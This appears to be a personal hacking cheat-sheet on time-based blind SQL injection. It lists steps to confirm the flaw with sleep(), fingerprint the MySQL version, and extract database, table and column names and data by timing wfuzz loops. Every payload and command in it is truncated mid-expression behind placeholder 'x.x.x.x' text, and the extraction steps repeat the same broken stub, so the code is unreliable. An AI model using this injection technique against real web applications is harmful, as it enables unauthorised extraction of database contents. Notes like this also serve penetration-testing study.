---
tags: 🔻 🔻/Enumeration/sqlinjection
aliases: Hacking Notes
---

# Time based SQL


Confirm time-based blind SQL injection using sleep() function  


and sleep(x.x.x.x  
  
Determine database version with time-based blind SQL injection using sleep(), like"", and conditional if, assuming the back-end database is running version 5  


and if((select version()) like "5%", sleep(x.x.x.x  
  
Determine database name with time-based blind SQL injection by observing http response time with substr(), ascii(), and wfuzz.The below range is the standard ASCII characters (32-127)  
for i in $(seq 1 x.x.x.x  
  
Determine table name with time-based blind SQL injection by observing http response time with substr(), ascii(), if, and wfuzz.The below range is the standard ASCII characters (32-127)  
for i in $(seq 1 x.x.x.x  
  
Determine column name with time-based blind SQL injection by observing http response time with substr(), ascii(), if, and wfuzz.The below range is the standard ASCII characters (32-127)  
for i in $(seq 1 x.x.x.x  
  
Extract column content with time-based blind SQL injection by observing http response time with substr(), ascii(), if, and wfuzz.The below range is the standard ASCII characters (32-127)  
for i in $(seq 1

